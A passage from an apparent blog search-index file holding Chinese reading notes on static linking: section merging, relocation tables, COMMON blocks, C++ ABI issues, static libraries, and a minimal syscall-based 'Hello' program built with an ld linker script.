*b; } 使用GCC编译器可以将a.c和b.c分别编译成目标文件a.o和b.o $ gcc -c a.c b.c ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:9:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"地址和空间分配 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:10:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"按序叠加 将输入的目标文件按照次序叠加起来，但是规模稍大的程序有很多目标文件，每个目标文件都有代码段和数据段，如果只是简单地按次序堆叠就会浪费空间，因为它们有对齐要求。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:10:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"相似段合并 将相同性质的段合并。 .bss段在目标文件和可执行文件中并不占用空间，但它在装载的时候占用空间，所以链接器合并各个段的时候也会合并.bss段并且分配虚拟空间。 链接器为目标文件分配地址和空间的地址和空间有两个含义：一是输出的可执行文件中的空间，二是装载后的虚拟地址中的虚拟地址空间。对于.bss这样的段来说，分配空间的意义仅局限于虚拟地址空间，因为它们在文件中无内容。这里只谈虚拟地址空间的分配，因为它关系到链接器后面关于地址计算的步骤，可执行文件本身的空间分配和链接过程关系不大。 目前链接器的空间分配策略都采用相似段合并。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:10:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"两步连接 这是链接器采取的方法 空间与地址分配 扫描所有的目标文件，获得它们段的长度、属性和位置，将目标文件中的符号表内的符号定义和符号引用收集起来放入全局符号表。 这一步中，链接器获得所有目标文件的段长度并将它们合并，计算输出文件中各个段合并后的长度和位置，建立映射关系。 符号解析和重定位 使用上一步收集的信息，读取输入文件中段的数据、重定位信息，进行符号解析和重定位，调整代码位置。 使用ld进行链接 使用ld将两个文件链接起来 ld a.o b.o -c main -o ab --fno-stack-protector -c指定入口函数，默认为_start，这里应为main $ objdump -h a.o a.o: file format elf64-x86-64 Sections: Idx Name Size VMA LMA File off Algn 0 .text 00000031 0000000000000000 0000000000000000 00000040 2**0 CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE 1 .data 00000000 0000000000000000 0000000000000000 00000071 2**0 CONTENTS, ALLOC, LOAD, DATA 2 .bss 00000000 0000000000000000 0000000000000000 00000071 2**0 ALLOC 3 .comment 0000001c 0000000000000000 0000000000000000 00000071 2**0 CONTENTS, READONLY 4 .note.GNU-stack 00000000 0000000000000000 0000000000000000 0000008d 2**0 CONTENTS, READONLY 5 .note.gnu.property 00000030 0000000000000000 0000000000000000 00000090 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 6 .eh_frame 00000038 0000000000000000 0000000000000000 000000c0 2**3 CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA $ objdump -h b.o b.o: file format elf64-x86-64 Sections: Idx Name Size VMA LMA File off Algn 0 .text 0000004b 0000000000000000 0000000000000000 00000040 2**0 CONTENTS, ALLOC, LOAD, READONLY, CODE 1 .data 00000004 0000000000000000 0000000000000000 0000008c 2**2 CONTENTS, ALLOC, LOAD, DATA 2 .bss 00000000 0000000000000000 0000000000000000 00000090 2**0 ALLOC 3 .comment 0000001c 0000000000000000 0000000000000000 00000090 2**0 CONTENTS, READONLY 4 .note.GNU-stack 00000000 0000000000000000 0000000000000000 000000ac 2**0 CONTENTS, READONLY 5 .note.gnu.property 00000030 0000000000000000 0000000000000000 000000b0 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 6 .eh_frame 00000038 0000000000000000 0000000000000000 000000e0 2**3 CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA $ objdump -h ab ab: file format elf64-x86-64 Sections: Idx Name Size VMA LMA File off Algn 0 .note.gnu.property 00000030 00000000004001c8 00000000004001c8 000001c8 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 1 .text 0000007c 0000000000401000 0000000000401000 00001000 2**0 CONTENTS, ALLOC, LOAD, READONLY, CODE 2 .eh_frame 00000058 0000000000402000 0000000000402000 00002000 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 3 .data 00000004 0000000000403000 0000000000403000 00003000 2**2 CONTENTS, ALLOC, LOAD, DATA 4 .comment 0000001b 0000000000000000 0000000000000000 00003004 2**0 CONTENTS, READONLY VMA表示虚拟地址，LMA表示加载地址。 链接前虚拟地址VMA为0，链接后各个段都分配了虚拟地址。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:10:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"符号地址的确定 链接器分配好空间地址之后，各个段链接后的虚拟地址已经确定。 上一步完成之后，链接器开始计算各个符号的虚拟地址，因为符号在段内的相对位置是确定的，所以只需要虚拟地址+偏移量即可。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:10:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"重定位与符号解析 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:11:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"重定位 空间和地址的分配之后，链接器就进入了符号解析与重定位的步骤 在链接器对外部引用进行地址修正之前，编译器对这些符号的地址设置被0x00000000和0xFFFFFFFC代替 $ objdump -d a.o a.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003cmain\u003e: 0: 55 push %rbp 1: 48 89 e5 mov %rsp,%rbp 4: 48 83 ec 10 sub $0x10,%rsp 8: c7 45 fc 64 00 00 00 movl $0x64,-0x4(%rbp) f: 48 8d 45 fc lea -0x4(%rbp),%rax 13: 48 8d 15 00 00 00 00 lea 0x0(%rip),%rdx # 1a \u003cmain+0x1a\u003e 1a: 48 89 d6 mov %rdx,%rsi 1d: 48 89 c7 mov %rax,%rdi 20: b8 00 00 00 00 mov $0x0,%eax 25: e8 00 00 00 00 call 2a \u003cmain+0x2a\u003e 2a: b8 00 00 00 00 mov $0x0,%eax 2f: c9 leave 30: c3 ret ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:11:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"重定位表 重定位表往往就是ELF文件中的一个段，每个需要重定位的段都存在对应的重定位表，比如代码段的重定位表就是.rel.text，.data段则为.rel.data。用objdump可以查看重定位表 $ objdump -r a.o a.o: file format elf64-x86-64 RELOCATION RECORDS FOR [.text]: OFFSET TYPE VALUE 0000000000000016 R_X86_64_PC32 shared-0x0000000000000004 0000000000000026 R_X86_64_PLT32 swap-0x0000000000000004 RELOCATION RECORDS FOR [.eh_frame]: OFFSET TYPE VALUE 0000000000000020 R_X86_64_PC32 .text 每个被重定位的地方叫一个重定位入口。OFFSET表示该入口在被重定位的段中的位置，RELOCATION RECORDS FOR[.text]表示这个重定位表是代码段的重定位表。 重定位表的定义如下： /* The following, at least, is used on Sparc v9, MIPS, and Alpha. */ typedef struct { Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */ } Elf64_Rel; /* I have seen two different definitions of the Elf64_Rel and Elf64_Rela structures, so we'll leave them out until Novell (or whoever) gets their act together. */ /* Relocation table entry with addend (in section of type SHT_RELA). */ typedef struct { Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */ Elf64_Sxword r_addend; /* Addend */ } Elf64_Rela; r_offset，重定位入口的偏移。对于可重定位文件来说，其值是该重定位入口所要修正的位置的第一个字节相对于段起始的偏移；对于可执行文件或共享目标文件来说，其值为该重定位入口所要修正位置的第一个字节的虚拟地址。 r_info，重定位入口的类型和符号，该成员低8位表示重定位入口的类型，高24位表示重定位入口的符号在符号表中的下标（64位中被分成了两个32位）。由于不同的处理器的指令格式有所不同，所以重定位所要修正 的指令地址格式也不一样。对于可执行文件和共享目标文件来说，它们的重定位入口是动态链接类型的。 r_addend，用于计算重定位地址时的加数 根据Oracle的文档描述，Rel有个隐式的加数 Rela entries contain an explicit addend. Entries of type Rel store an implicit addend in the location to be modified. File Format ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:11:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"符号解析 重定位的过程伴随着符号的解析过程。重定位的过程中，每个重定位的入口都是对一个符号的引用，当链接器对某个符号的引用进行重定位时，它就要确定这个符号的目标地址。这时候链接器会去查找所有输入目标文件的符号表组成的全局符号表，找到相应的符号进行重定位。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:11:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"指令修正方式 重定位方式指令修正方式区别在于绝对寻址和相对寻址 宏定义 值 重定义修正方法 R_386_32 1 绝对寻址修正 符号的实际位置+保存在被修证位置的值 R_386_PC32 2 相对寻址修正 符号的实际位置+保存在被修正位置的值-被修正的位置（相对于段来说的偏移量或虚拟地址） 假设a.o和b.o链接成最终可执行文件后，main函数的虚拟地址是0x1000，swap函数是0x2000，shared变量虚拟地址是0x3000，shared变量编译器未链接时填充为0x00000000，swap填充0xFFFFFFFC shared的修正方式是R_386_32，即绝对地址修正。对于这个重定位入口，修正的结果应该是0x30000+0x00000000=0x3000 swap的休整方式R_386_PC32，相对寻址修正，结果是0x2000+(-4)-(0x1000+0x27)=0xFD5，常量-4是0xFFFFFFFC的补码形式，这条call指令是偏移为0x26的。 call指令的下一条指令的起始地址加上call指令后面接的偏移量，就是swap函数的地址。 上述关于指令修正方式的解释是书中所述。 之前objdump -r读到的类型是R_X86_64_PC32和R_X86_64_PLT32。前者和上面介绍的相对寻址修正差不多，后者和前者差不多（关于后者可以看下How does the address of R_X86_64_PLT32 computed?）。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:11:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"COMMON块 弱符号机制允许同一个符号定义存在多个文件之中。如果一个弱符号定义在多个目标文件中而类型不同，链接器又不支持符号的类型该如何处理。这里有三种情况： 两个或两个以上的强符号类型不一致 有一个强符号，其他都是弱符号，符号不一致 两个或两个以上弱符号不一致 对于第一种情况，链接器会报符号多重定义错误，链接器所要应对的是后两种情况 链接器处理弱符号时采用的是COMMON（Common Block）块机制，即如果多个弱符号，以占用空间最大的符号为准。 如果一个符号是强符号，最终的输出结果和强符号相同，链接过程如果弱符号大于强符号，ld链接器就会打印一条警告信息。 这里也知道了为什么未初始化的全局变量不会像未初始化的局部静态变量一样被编译器放在.bss段里，因为编译器无法确定这个弱符号最终的大小，只能由链接器读取所有的目标文件之后确定大小。这时候未初始化的全局变量就会在BSS段分配空间了。总体来看，它俩是都存储在BSS段的。 GCC的-fno-common允许为所有未初始化的全局变量不以COMMON块的形式处理，或者使用__attribute__扩展 int global __attribute__((nocommon)); 一旦一个未初始化的全局变量不是以COMMON块的形式存在，那么它就相当于一个强符号，如果其他目标文件也有这个强符号，就会发生符号重复的错误。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:12:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"C++相关的问题 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:13:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"重复代码消除 C++编译器可能产生很多重复的代码，比如模板、外部内联函数和虚函数表。一个模板在多个编译单元被实例化成为相同类型的时候就会产生重复的代码。 主流方法是将每个模板的实例代码都单独放在一个段里。比如有一个模板函数add\u003cT\u003e()一个编译单元以int和float，编译单元的亩薄啊文件就包含了连个该模板实例的段，假设分别为.temp.add\u003cint\u003e和.temp.int\u003cfloat\u003e，别的编译单元也以int和float实例化该模板函数时，也会产生相同的名字，这样最终链接的时候可以区分这些相同的模板实例段，将它们合并到代码段。 GCC和Visual C++都是如此，GCC最终链接合并的段叫做Link Once，段被命名为.gnu.linkonce.name，name是模板函数实例的修饰后名称。Visual C++做法稍有不同，它把这种类型的段叫做COMDAT这种段的属性字段都有IMAGE_SCN_LNK_COMDAT(0x00001000)标记，链接器看到这个标志就会认为这个段是COMDAT类型，链接时丢弃重复段。 上述方法说的是模板，对于外部内联函数和虚函数表来说是类似的。 函数级别链接 VISUAL C++提供了函数级别链接选项这个选项让所有的函数能像前面介绍的模板函数一样单独保存在一个段里面，当链接器需要使用某个目标文件的函数的时候就会将它合并到输出文件中，抛弃目标文件中其他无用的函数。 这样的链接比起往常会把无用的函数一起链接进来的整个地址链接减少了空间浪费。但这个优化会减慢编译和链接过程，链接器会计算函数之间的依赖关系并把其放在独立的段中，目标文件随着段数目的增加会变得相对较大，重定位过程因为段的数目的增加变得复杂，目标函数的段的数量也有所增加 GCC提供了类似的机制，它有两个选择分别是-ffunction-sections和-fdata-sections，区别在于是将函数保存单独段还是变量保存单独段。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:13:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"全局构造与析构 Linux系统一般程序入口是_start，这是Linux系统库（Glibc）的一部分。程序与和Glibc库链接在一起形成最终可执行文件之后，这个函数就是程序的初始化部分的入口，程序初始化完成部分完成一系列初始化过程之后会调用main函数，main函数结束之后返回到初始化部分，它会进行一些清理工作然后结束进程。 ELF定义了两个特殊的段——.init和.fini前者存放Glibc初始化部分安排执行的代码，后者存放main函数正常退出时Glibc执行的代码。 全局构造在main函数执行前执行，它的析构在main函数结束了再执行也是因此了。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:13:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"C++与ABI 编译器编译出的目标文件能够相互链接它们必须满足下列的条件 采用同样的目标文件格式 拥有相同的符号修饰标准 变量的内存分布方式相同、函数调用方式相同 …… 上述和可执行二进制兼容性相关的内容称为ABI（Application Binary Interfeace） ABI和API的区别在于前者针对二进制层面，后者针对源代码层面。ABI的兼容程度要比API更为严格。比如POSIX这个API标准规定printf()这个函数的原型，保证了函数定义在所有遵循POSIX标准的系统之间都是一样的，但是它无法保证这个函数实际执行的时候，参数是按照什么顺序压栈，参数在堆栈上如何分布，调用指令是否相同（x86是call，MIPS是jal）。 C++让人诟病的就是二进制兼容不好，比起C语言来说更为不易。不仅不同编译器编译的二进制代码之间无法兼容，同一个编译器也有可能出现这个情况。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:13:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"静态库链接 一种语言的开发环境往往附带语言库。这些库通常是对操作系统的API的包装。比如printf()函数会对字符串进行一些必要的处理后，最后调用操作系统提供的API。各个操作系统下在终端输出字符串的API都不一样，linux下是write系统调用，Windows下则是WriteConsole系统API。 库里面还会有一些很常用的函数，比如用于获取字符串长度的strlen()，该函数遍历整个字符串后返回字符串的长度，这个函数没有调用任何操作系统的API。 一个静态库可以简单地看作一组目标文件的集合，即多个目标文件压缩打包后形成的文件。比如linux中最常用的C语言静态库libc位于/usr/lib/libc.a，它属于Glibc项目的一部分。可以使用ar工具查看该文件包含了哪些目标文件。 $ ar -t /usr/lib/libc.a init-first.o libc-start.o sysdep.o version.o check_fds.o libc-tls.o dso_handle.o errno.o errno-loc.o iconv_open.o iconv.o iconv_close.o gconv_open.o gconv.o gconv_close.o gconv_db.o gconv_conf.o gconv_builtin.o ... 这些目标文件也会相互依赖，使用GCC编译器的-verbose选项可以把编译过程的中间步骤打印出来，--fno-builtin保证GCC不会开启内置函数的优化选项，可以从此一窥Hello.c的中间步骤 这里的Hello.c不是上面的，只是简单打印一个Hello #include\u003cstdio.h\u003e int main(void){ printf(\"Hello\\n\"); return 0; } $ gcc -static --verbose -fno-builtin Hello.c Using built-in specs. COLLECT_GCC=gcc COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/lto-wrapper Target: x86_64-pc-linux-gnu Configured with: /build/gcc/src/gcc/configure --enable-languages=c,c++,ada,fortran,go,lto,objc,obj-c++,d --enable-bootstrap --prefix=/usr --libdir=/usr/lib --libexecdir=/usr/lib --mandir=/usr/share/man --infodir=/usr/share/info --with-bugurl=https://bugs.archlinux.org/ --with-build-config=bootstrap-lto --with-linker-hash-style=gnu --with-system-zlib --enable-__cxa_atexit --enable-cet=auto --enable-checking=release --enable-clocale=gnu --enable-default-pie --enable-default-ssp --enable-gnu-indirect-function --enable-gnu-unique-object --enable-libstdcxx-backtrace --enable-link-serialization=1 --enable-linker-build-id --enable-lto --enable-multilib --enable-plugin --enable-shared --enable-threads=posix --disable-libssp --disable-libstdcxx-pch --disable-werror Thread model: posix Supported LTO compression algorithms: zlib zstd gcc version 12.2.1 20230111 (GCC) COLLECT_GCC_OPTIONS='-static' '-v' '-fno-builtin' '-mtune=generic' '-march=x86-64' '-dumpdir' 'a-' /usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/cc1 -quiet -v Hello.c -quiet -dumpdir a- -dumpbase Hello.c -dumpbase-ext .c -mtune=generic -march=x86-64 -version -fno-builtin -o /tmp/cc0STAo1.s GNU C17 (GCC) version 12.2.1 20230111 (x86_64-pc-linux-gnu) compiled by GNU C version 12.2.1 20230111, GMP version 6.2.1, MPFR version 4.2.0, MPC version 1.3.1, isl version isl-0.25-GMP GGC heuristics: --param ggc-min-expand=100 --param ggc-min-heapsize=131072 ignoring nonexistent directory \"/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/../../../../x86_64-pc-linux-gnu/include\" #include \"...\" search starts here: #include \u003c...\u003e search starts here: /usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/include /usr/local/include /usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/include-fixed /usr/include End of search list. GNU C17 (GCC) version 12.2.1 20230111 (x86_64-pc-linux-gnu) compiled by GNU C version 12.2.1 20230111, GMP version 6.2.1, MPFR version 4.2.0, MPC version 1.3.1, isl version isl-0.25-GMP GGC heuristics: --param ggc-min-expand=100 --param ggc-min-heapsize=131072 Compiler executable checksum: c5620313e3defc07ff561cb90de48ddc COLLECT_GCC_OPTIONS='-static' '-v' '-fno-builtin' '-mtune=generic' '-march=x86-64' '-dumpdir' 'a-' as -v --64 -o /tmp/cc1DGmYx.o /tmp/cc0STAo1.s GNU assembler version 2.40 (x86_64-pc-linux-gnu) using BFD version (GNU Binutils) 2.40 COMPILER_PATH=/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/:/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/:/usr/lib/gcc/x86_64-pc-linux-gnu/:/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/:/usr/lib/gcc/x86_64-pc-linux-gnu/ LIBRARY_PATH=/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/:/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/../../../../lib/:/lib/../lib/:/usr/lib/../lib/:/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/../../../:/lib/:/usr/lib/ COLLECT_GCC_OPTIONS='-static' '-v' '-fno-builtin' '-mtune=generic' '-march=x86-64' '-dumpdir' 'a.' /usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/collect2 -plugin /usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.1/lto-wrapper -plugin-opt=-fresolution=/tmp/cc5qtz","date":"2022-10-30","objectID":"/posts/op_power-static-link/:14:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"链接过程控制 在大多数情况下，链接器默认链接规则没有问题，但对一些有特殊要求的程序，比如操作系统内核、BIOS和一些没有操作系统的情况下运行的程序（Boot Loader或嵌入式系统的程序），以及一些需要特殊的链接过程的程序等，它们往往受限于一些特殊条件，如需要指定输出文件的各个段的虚拟地址、段的名称、段存放的顺序等，因为这些特殊的环境，特别是某些硬件调价的限制，往往对程序的各个段的地址有特殊的要求。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:15:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"链接控制脚本 使用命令行给链接器指定参数，比如ld -e这样的 将链接指定存放在目标文件里，编译器经常通过这种方法想链接器传递指令。 使用链接控制脚本 由于各个链接平台的链接过程不同，这里只说明ld链接器。 ld在用户没有指定链接脚本的时候会使用默认脚本，可以使用下面的命令查看ld默认的链接脚本 $ ld -verbose 默认ld链接脚本存放在/usr/lib/ldscripts/下，不同的机器平台和输出文件格式都有对于的脚本 为了精准控制链接过程，也可以使用自己的链接脚本，使用-T参数 $ ld -T link.script ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:15:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"最“小”的程序 为了演示链接的控制过程，下面将做一个最“小”的程序。也就是打印一个Hello。但不能像上面演示gcc编译过程时使用的那样，理由如下 其使用了printf()函数，该函数时系统C语言库的一部分。为了使用该函数，连接时就需要将C语言库和目标文件链接产生最终可执行文件。这里希望它能脱离C语言库。 由于使用了库，就需要main函数。程序入口是库的_start，由库负责初始化后调用main函数来执行程序的主体部分。这里为了加以区分，会使用nomain作为程序的入口。 这里希望把所有段都合并到一个叫tinytext的段，这是由链接脚本控制链接过程生成的。 char* str = \"Hello\\n\"; void print(){ asm( \"movq $1, %rax \\n\\t\" \"movq $1, %rdi \\n\\t\" \"movq (str), %rsi \\n\\t\" \"movq $6, %rdx \\n\\t\" \"syscall \\n\\t\" ); } void exit(){ asm( \"movq $60, %rax \\n\\t\" \"movq $42, %rdi \\n\\t\" \"syscall \\n\\t\" ); } void nomain(){ print(); exit(); } 与本书不同的是，我尽量采用64位的，所以程序源码已经被我修改了。 这是使用C语言，如果使用汇编，还会进一步压缩文件的大小[doge]，下面是我更改蒋炎岩老师在网站上放的一段代码，下面的下载链接就是蒋炎岩老师所写代码的下载链接 下载链接 .globl nomain nomain: movq $1, %rax movq $1, %rdi movq $mes, %rsi movq $6, %rdx syscall movq $60, %rax movq $42, %rdi syscall mes: .ascii \"Hello\\n\" 这里没有使用库函数，而是直接使用了linux的系统调用完成了在终端打印hello并退出，下面是他俩的函数声明： ssize_t write(int fd, const void buf[.count], size_t count); void _exit(int status) 关于write的介绍，可以在man-pages中找到，同理，exit也可以 $ man 2 write write() writes up to count bytes from the buffer starting at buf to the file referred to by the file descriptor fd. write(2) — Linux manual page 在bash shell中，可以通过echo $?查看退出码42，如果是fish shell，默认直接显示，而且不能通过echo $?打印。 先看一个简单的链接脚本test.lds（一般链接脚本的后缀名都是lds,ld script）的例子 ENTRY(nomain) SECTIONS { . = 0x00400000 + SIZEOF_HEADERS; tinytext : { *(.text) * (.data) * (.rodata) } /DISCARD/ : { *(.comment) } } 第一行指定了程序的入口为nomain()函数，后面的SECTIONS命令一般是链接脚本的主体，这个命令指定了各种输入端到输出段的交换。这里面有三个语句，第一个是赋值语句，剩下两个是段转换规则，其含义基本如下： . = 0x00400000 + SIZEOF_HEADERS; 第一条赋值语句的意思是将当前虚拟地址空间设置成 0x00400000 + SIZEOF_HEADERS，SIZEOF_HEADERS为输出文件的文件头大小。.表示当前虚拟地址，因为后面紧跟着输出段tinytext，所以这个段的起始地址就是 0x00400000 + SIZEOF_HEADERS。 tinytext : { *(.text) * (.data) * (.rodata) } 所有输入文件名字为.text、.data和.rodata的段依次合并到输出文件的.tinytext /DISCARD/ : { *(.comment) } 将所有输入文件中名字为.commit的段丢弃，不保存在输出文件中 最后我的打印Hello程序的链接脚本是： ENTRY(nomain) SECTIONS { . = 0x00400000 + SIZEOF_HEADERS; tinytext : { *(.text) * (.data) * (.rodata) *(.data.rel.local) } /DISCARD/ : { *(.comment) *(.note.gnu.property) *(.eh_frame ) } } $ gcc -c -fno-builtin hello.c $ ld -static -T test.lds -o hello hello.o ld: warning: hello has a LOAD segment with RWX permissions 使用objdump可以发现只有tinytext一个段了 $ objdump -h hello hello: file format elf64-x86-64 Sections: Idx Name Size VMA LMA File off Algn 0 tinytext 00000068 00000000004000e8 00000000004000e8 000000e8 2**3 CONTENTS, ALLOC, LOAD, CODE 但使用readelf可以发现事实并非如此 $ readelf -S hello There are 5 section headers, starting at offset 0x228: Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] tinytext PROGBITS 00000000004000e8 000000e8 0000000000000068 0000000000000000 WAX 0 0 8 [ 2] .symtab SYMTAB 0000000000000000 00000150 0000000000000090 0000000000000018 3 2 8 [ 3] .strtab STRTAB 0000000000000000 000001e0 000000000000001e 0000000000000000 0 0 1 [ 4] .shstrtab STRTAB 0000000000000000 000001fe 0000000000000024 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), D (mbind), l (large), p (processor specific) ld链接器默认会产生序号为2、3、4这三个段。对于可执行文件来说，符号表和字符串表是可选的，但段名字符串表保存段名故而不可缺少。 可以使用ld -s禁止产生符号表或者使用strip $ ld -static -s -T test.lds -o hello hello.o ld: warning: hello has a LOAD segment with RWX permissions $ readelf -S hello There are 3 section headers, starting at offset 0x168: Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] tinytext PROGBITS 00000000004000e8 000000e8 0000000000000068 0000000000000000 WAX 0 0 8 [ 2] .shstrtab STRTAB 0000000000000000 00000150 0000000000000014 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS process","date":"2022-10-30","objectID":"/posts/op_power-static-link/:15:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"ld链接语法简介 ld链接器的连接脚本语法继承于AT\u0026T链接器命令语言的语法。连接脚本由一系列语句组成，语句分两种，一种是命令语句，另一种是赋值语句。 之前的test.lds有两个命令语句，ENTRY和SECTIONS。其中SECTIONS负责链接过程的段转换过程，是链接最核心和最复杂的部分。 命令语句 说明 ENTRY(symbol) 指定符号symbol的值为入口地址。入口地址即进程执行的第一条用户空间的指令在进程地址空间的地址，它被指定在ELF文件头Elf64_Ehdr的e_entry成员中。ld有多种方法设置进程入口地址。 STARTUP(filename) 将文件filename作为链接过程的第一个输入文件 SEARCH_DIR(path) 将路径path加入到ld链接器的库查找目录。ld会根据指定的目录去查找相应的库，也可以使用-Lpath指定 INPUT(file,file,…) 将指定文件作为链接过程的输入文件 INCLUDE filename 将指定文件包含进链接脚本 PROVIDE(symbol) 将链接脚本中定义某个符号。该符号可以在程序中被引用。之前提到的特殊符号都是通过这个方法定义在脚本中 ld有多种方法设置进程入口地址，其优先级为： ld命令行的-e选项 链接脚本的ENTRY命令 如果_strat符号有定义，使用这个符号 如果存在.text段，使用这个段的第一个字节的地址 使用0 SECTIONS命令语句的基本格式为： SECTIONS { ... secname : { contents } ... } secname表示输出端的段名，secname后面需要跟一个空格，后面紧跟着冒号和一对大括号。contents描述了一套规则和条件，它表示符号这种条件的输入段将合并到这个输出端中。输出段名的命名方法必须满足输出文件的格式要求，比如使用ld产生一个a.out格式的文件，输出段名不能使用.text、data和.bss之外的任何名字，因为这个格式规定了段名。 有一个特殊的段就是/DISCARD/如果这个名字是输出端，所有符合contents条件的段都会被丢弃。 contents可以包含多个条件，条件之间使用空格隔开。条件的写法如下： filename(sections) fielname是输入文件名，sections是段名 file1.o(.data)表示输入文件名为file1.o的文件中的.data段符合条件 file1.o(.data .rodata)或file1.o(.data, .rodata)二者都表示file1.o文件中的.data或.rodata符合条件 file1.o表示其所有段都符合条件 *(.data)表示所有输入文件的.data段符合条件。*是通配符，类似正则表达式的*，这里允许使用正则表达式 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:15:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"BFD库 BFD (Binary File Descriptor libray)是一个GNU项目，它目标是通过一种同意的接口去处理不同的目标格式，因为现在硬件和软件平台种类繁多。 现在的GCC、ld、GDB及Binutils的其他工具都通过BFD库处理目标文件，而不是直接操作目标文件。 Windows PE/COFF Windows引入了一种叫PE (Protable Executable)的可执行格式作为该平台的标准可执行文件格式。PE和ELF同根同源，二者都由COFF (Common Object File Format)格式发展而来。 微软对64位Windows平台的PE结构做了一些修改，新的文件格式叫做PE32+，新格式没有添加任何结构，最大变化就是把32位的字段改成了64位。 与ELF文件相同，PE/COFF格式也采取基于段的格式。代码段名字往往叫做.code，数据段叫.data，不同编译器使用的段名可能有所不同。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:16:0","tags":["readding notes","compilation 